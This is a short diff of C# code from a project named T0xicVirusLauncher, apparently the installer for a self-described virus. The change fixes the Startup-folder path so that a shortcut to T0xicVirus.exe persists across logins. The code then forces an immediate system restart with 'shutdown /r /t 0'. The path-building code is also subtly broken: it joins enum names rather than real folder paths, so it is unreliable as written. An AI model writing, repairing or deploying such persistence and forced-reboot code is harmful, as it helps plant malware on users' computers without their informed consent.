@@ -46,7 +46,7 @@ namespace T0xicVirusLauncher
             shortcut.TargetPath = @"C:\ToxicVirus\T0xicVirus.exe";
             shortcut.WorkingDirectory = @"C:\ToxicVirus";
             shortcut.Save();
-            System.IO.File.Copy(Environment.SpecialFolder.Desktop + @"\T0xicVirus.lnk", Environment.SpecialFolder.ApplicationData + @"Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T0xicVirus.lnk");
+            System.IO.File.Copy(Environment.SpecialFolder.Desktop + @"\T0xicVirus.lnk", Environment.SpecialFolder.ApplicationData + @"\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T0xicVirus.lnk");
             MessageBox.Show("Install T0xicVirus is Complete, Your PC will be automatically restart", "T0xic Virus Launcher", MessageBoxButtons.OK, MessageBoxIcon.Information);
             Process.Start("shutdown", "/r /t 0");
             Environment.Exit(-4);
